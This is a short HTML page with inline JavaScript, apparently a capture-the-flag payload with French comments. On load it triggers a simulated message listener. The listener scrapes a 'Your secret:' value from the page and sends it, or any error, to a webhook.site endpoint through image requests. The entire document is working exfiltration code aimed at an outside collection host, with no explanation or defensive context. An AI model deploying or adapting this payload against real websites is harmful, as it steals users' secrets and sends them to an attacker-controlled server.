<html>
<script>
// Simuler l'ouverture d'une popup pour rester dans le style CTF
var win = window.open("", "_blank"); // popup vide pour éviter la SOP

// Installer un "listener" simulé
function exfiltrateSecret() {
    try {
        // Vérifier si le secret existe dans le DOM
        var match = document.body.innerText.match(/Your secret:\s*(.+)/);
        if(match && match[1]){
            var secret = match[1];
            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
        } else {
            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=Secret_not_found';
        }
    } catch(e){
        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
    }
}

// Listener simulé
window.addEventListener('message', function(event) {
    // Déclencher l'exfiltration après un petit délai
    setTimeout(exfiltrateSecret, 500);
});

// Déclencher le listener simulé
setTimeout(function() {
    window.dispatchEvent(new MessageEvent('message', {data: 'trigger'}));
}, 500);
</script>
</html>
